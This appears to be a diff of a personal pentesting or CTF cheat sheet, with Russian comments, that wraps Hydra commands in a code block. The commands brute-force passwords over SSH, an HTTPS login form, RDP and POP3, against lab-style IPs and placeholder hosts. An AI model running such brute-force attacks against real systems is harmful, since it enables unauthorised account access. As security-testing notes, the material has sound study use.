@@ -1,7 +1,6 @@
-    брутит пароль по словарю пользователя leo на ssh  
-  
+```bash
+брутит пароль по словарю пользователя leo на ssh  
 hydra -l leo -P words 192.168.1.39 ssh  
-  
   
 hydra 10.10.10.43 -l username -P /pwdlist.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:The password you entered "  
 ^PHPLiteSQL  
@@ -26,3 +25,6 @@ hydra -t 1 -V -f -l administrator -P /path/to/wordlist.txt rdp://ipv4Ad
   
 # hydra: bruteforce POP3  
 hydra -l userName -P /path/to/wordlist -f ipv4Address pop3 -V
+```
+
+
